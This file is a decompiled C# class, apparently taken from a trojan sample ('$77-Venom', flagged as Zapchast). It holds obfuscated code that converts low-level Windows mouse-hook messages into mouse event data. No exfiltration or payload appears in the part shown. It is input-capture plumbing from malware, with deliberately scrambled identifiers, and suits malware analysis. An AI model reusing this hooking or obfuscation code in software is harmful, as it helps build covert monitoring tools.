// Decompiled with JetBrains decompiler
// Type: 棿䠚㗉ࢿ㏃텬힉�唋傕擦푳媇䌽쥳랩೙
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9 : MouseEventArgs
{
  internal 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9(
    MouseButtons buttons,
    int clicks,
    졕袃ᗬ礤뽀鷮慫릀羾䙾컓鸵ᨦ턟譖瑍\uFFFD䭳ꪮ\uFFFD point,
    int delta,
    int timestamp,
    bool isMouseKeyDown,
    bool isMouseKeyUp)
    : base(buttons, clicks, point.產݈騁餗\uEE69攺咊୯澓徂\uE8E5\uF34Bꏩ㡂\u3373\u19E9鈺羀႙繡, point.囆ᅾ䙈\u2E2D쿽\uF288ｍ퇇ᗍ\u08DB굫ᷨ䳃\u2603䝭矱᪁\u08C6瓹炯, delta)
  {
    this.IsMouseKeyDown = isMouseKeyDown;
    this.IsMouseKeyUp = isMouseKeyUp;
    this.Timestamp = timestamp;
  }

  public bool Handled { get; set; }

  public bool WheelScrolled => this.Delta != 0;

  public bool Clicked => this.Clicks > 0;

  public bool IsMouseKeyDown { get; private set; }

  public bool IsMouseKeyUp { get; private set; }

  public int Timestamp { get; private set; }

  internal 졕袃ᗬ礤뽀鷮慫릀羾䙾컓鸵ᨦ턟譖瑍\uFFFD䭳ꪮ\uFFFD Point => new 졕袃ᗬ礤뽀鷮慫릀羾䙾컓鸵ᨦ턟譖瑍\uFFFD䭳ꪮ\uFFFD(this.X, this.Y);

  internal static 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9 歀쯠\u0E5F\uFFFD類懀십㔲ﱛ泧讐衊汽햗\u20BBꈴＱ럨䘺簩(
    ᠸ3귦觤娼闙\uEB3F揂숿涜頭᥏뼶榦듘㾇긟랈欐멒 data)
  {
    return 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9.\uF6A5鲈迍\uF584\uA7F2Ш鬇\u33A3鷑\u2366测負坣鋔醓椊楉좩샳責(data.WParam, ((쵱ꦁ畂愸䡗귯ꜟꁜ壠臺霙䑞蛋ကﱦ\uE84B츭劳諘係) Marshal.PtrToStructure(data.LParam, typeof (쵱ꦁ畂愸䡗귯ꜟꁜ壠臺霙䑞蛋ကﱦ\uE84B츭劳諘係))).狁ﵕ虡풁罋㳙ꑜ麅鋔\uFFFD\uE5A3\uE770ޫꚗ蒇困\uE8F4\u309Cᨋ핺());
  }

  internal static 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9 鮌䇤볺䚦\u23D5锳㟉㭫ɝ粤黆陑\uE3C4롗廸ﱥ䦵퍨녟\uEECF(
    ᠸ3귦觤娼闙\uEB3F揂숿涜頭᥏뼶榦듘㾇긟랈欐멒 data)
  {
    return 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9.\uF6A5鲈迍\uF584\uA7F2Ш鬇\u33A3鷑\u2366测負坣鋔醓椊楉좩샳責(data.WParam, (앙ĥﰔ㢒軋莺꧰층탅Ἕ產阂儒ꄪ\uFBBAꂝ蛾뇢臖\uFFFD) Marshal.PtrToStructure(data.LParam, typeof (앙ĥﰔ㢒軋莺꧰층탅Ἕ產阂儒ꄪ\uFBBAꂝ蛾뇢臖\uFFFD)));
  }

  private static 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9 \uF6A5鲈迍\uF584\uA7F2Ш鬇\u33A3鷑\u2366测負坣鋔醓椊楉좩샳責(
    IntPtr wParam,
    앙ĥﰔ㢒軋莺꧰층탅Ἕ產阂儒ꄪ\uFBBAꂝ蛾뇢臖\uFFFD mouseInfo)
  {
    MouseButtons buttons = MouseButtons.None;
    short delta = 0;
    int clicks = 0;
    bool isMouseKeyDown = false;
    bool isMouseKeyUp = false;
    long num = (long) wParam - 513L;
    if ((ulong) num <= 13UL)
    {
      switch ((uint) num)
      {
        case 0:
          isMouseKeyDown = true;
          buttons = MouseButtons.Left;
          clicks = 1;
          break;
        case 1:
          isMouseKeyUp = true;
          buttons = MouseButtons.Left;
          clicks = 1;
          break;
        case 2:
          isMouseKeyDown = true;
          buttons = MouseButtons.Left;
          clicks = 2;
          break;
        case 3:
          isMouseKeyDown = true;
          buttons = MouseButtons.Right;
          clicks = 1;
          break;
        case 4:
          isMouseKeyUp = true;
          buttons = MouseButtons.Right;
          clicks = 1;
          break;
        case 5:
          isMouseKeyDown = true;
          buttons = MouseButtons.Right;
          clicks = 2;
          break;
        case 6:
          isMouseKeyDown = true;
          buttons = MouseButtons.Middle;
          clicks = 1;
          break;
        case 7:
          isMouseKeyUp = true;
          buttons = MouseButtons.Middle;
          clicks = 1;
          break;
        case 8:
          isMouseKeyDown = true;
          buttons = MouseButtons.Middle;
          clicks = 2;
          break;
        case 9:
          delta = mouseInfo.\uE0FB\uF1E9ܓ왵歱Ѭ\uFFFD\u333A\uE11E뮹더䣪慨翅潽䉻떵㸼\u25AC爩;
          break;
        case 10:
          buttons = mouseInfo.\uE0FB\uF1E9ܓ왵歱Ѭ\uFFFD\u333A\uE11E뮹더䣪慨翅潽䉻떵㸼\u25AC爩 == (short) 1 ? MouseButtons.XButton1 : MouseButtons.XButton2;
          isMouseKeyDown = true;
          clicks = 1;
          break;
        case 11:
          buttons = mouseInfo.\uE0FB\uF1E9ܓ왵歱Ѭ\uFFFD\u333A\uE11E뮹더䣪慨翅潽䉻떵㸼\u25AC爩 == (short) 1 ? MouseButtons.XButton1 : MouseButtons.XButton2;
          isMouseKeyUp = true;
          clicks = 1;
          break;
        case 12:
          isMouseKeyDown = true;
          buttons = mouseInfo.\uE0FB\uF1E9ܓ왵歱Ѭ\uFFFD\u333A\uE11E뮹더䣪慨翅潽䉻떵㸼\u25AC爩 == (short) 1 ? MouseButtons.XButton1 : MouseButtons.XButton2;
          clicks = 2;
          break;
        case 13:
          delta = mouseInfo.\uE0FB\uF1E9ܓ왵歱Ѭ\uFFFD\u333A\uE11E뮹더䣪慨翅潽䉻떵㸼\u25AC爩;
          break;
      }
    }
    return new 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9(buttons, clicks, mouseInfo.豕䠙鬧喭ꅔɑ숑建ݪ蛢ᡕ\uE7B0\uE939꾯邑ᘚꅱ㴶揭㖾, (int) delta, mouseInfo.ᎍⱳ蓄\u243D뵂耨磏歾ރ尞䢕\uF47E헓\u0C5E噳뜠\uFFFD콍옒ꠔ, isMouseKeyDown, isMouseKeyUp);
  }

  internal 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9 韴瘭붟韎巿瘻䇯鷔ԁ䶳\uF1B1ꭲ皽䠵ᩪ\uF217곫\uFFFD祙桹() => new 棿䠚㗉\u08BF\uEA2F\u33C3텬힉\uFFFD唋傕\uF1F6擦푳\uE462媇䌽쥳랩\u0CD9(this.Button, 2, this.Point, this.Delta, this.Timestamp, this.IsMouseKeyDown, this.IsMouseKeyUp);
}
